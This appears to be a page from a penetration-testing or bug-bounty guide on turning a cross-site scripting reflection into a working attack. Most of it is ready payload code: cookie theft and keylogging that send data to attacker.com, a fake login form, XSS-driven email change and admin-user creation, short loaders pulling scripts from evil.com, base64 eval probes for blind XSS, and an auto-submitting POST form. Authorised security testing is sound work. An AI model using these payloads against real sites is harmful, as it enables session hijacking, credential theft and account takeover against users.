# XSS Exploitation

You found a reflection. Now make it matter.

## Confirm Execution

### Step 1: Prove Script Execution

Don't use `alert(1)`. Use something that proves context:

```javascript
alert(document.domain)
alert(document.cookie)
console.log(document.domain)
```

!!! warning "alert() might be blocked"
    Some sites override `alert()`. Use `console.log()` or `prompt()` as fallback.

### Step 2: Document the Payload

Save:
- Full URL with payload
- HTTP request (if POST)
- Screenshot of execution
- Context (where payload lands)

## Weaponization

### Session Hijacking

```javascript
// Send cookies to attacker
new Image().src="https://attacker.com/steal?c="+document.cookie;

// Fetch version (more data)
fetch("https://attacker.com/steal?c="+document.cookie);

// With full request details
fetch("https://attacker.com/log",{method:"POST",body:JSON.stringify({cookie:document.cookie,url:location.href})});
```

### Keylogging

```javascript
document.onkeypress=function(e){
  new Image().src="https://attacker.com/log?k="+e.key;
}
```

### Phishing (Fake Login)

```javascript
document.body.innerHTML='<h1>Session Expired</h1><form action="https://attacker.com/phish" method="POST"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
```

### CSRF via XSS

```javascript
// Change email (account takeover setup)
fetch("/api/user/email",{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({email:"attacker@evil.com"})
});
```

### Admin Actions

```javascript
// Add admin user
fetch("/admin/users/create",{
  method:"POST",
  headers:{"Content-Type":"application/x-www-form-urlencoded"},
  body:"username=hacker&password=hacker123&role=admin"
});
```

## External Script Loading

If payload length is limited:

```javascript
// Short loader
<script src=//evil.com/x.js></script>

// Even shorter
<script src=//evil.com>
```

Your `x.js` contains the full payload.

## Blind XSS

For stored XSS in admin panels you can't access:

```javascript
"><script src=https://your-xss-hunter.com/probe.js></script>

"><img src=x onerror=eval(atob('BASE64_PAYLOAD'))>
```

Use:
- [XSS Hunter](https://xsshunter.com)
- [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- Your own server

## Delivery Methods

### Reflected XSS

```
https://target.com/search?q=<script>alert(1)</script>
```

Link shortener to hide payload, or:

```html
<a href="https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E">Click here</a>
```

### POST-based XSS

Create auto-submit form:

```html
<html>
<body>
<form id="f" action="https://target.com/vuln" method="POST">
  <input name="param" value="<script>alert(1)</script>">
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>
```

## Browser-Specific

### Chrome

- Strict CSP enforcement
- Doesn't run inline scripts easily with CSP

### Firefox

- More lenient in some edge cases
- Different SVG handling

### Safari

- `javascript:` in meta refresh sometimes works
- Some unique DOM behaviors

---

Hit filters or WAF? Check [Bypasses](bypasses.md).

Got execution? Move to [Escalation](escalate.md) to maximize impact.
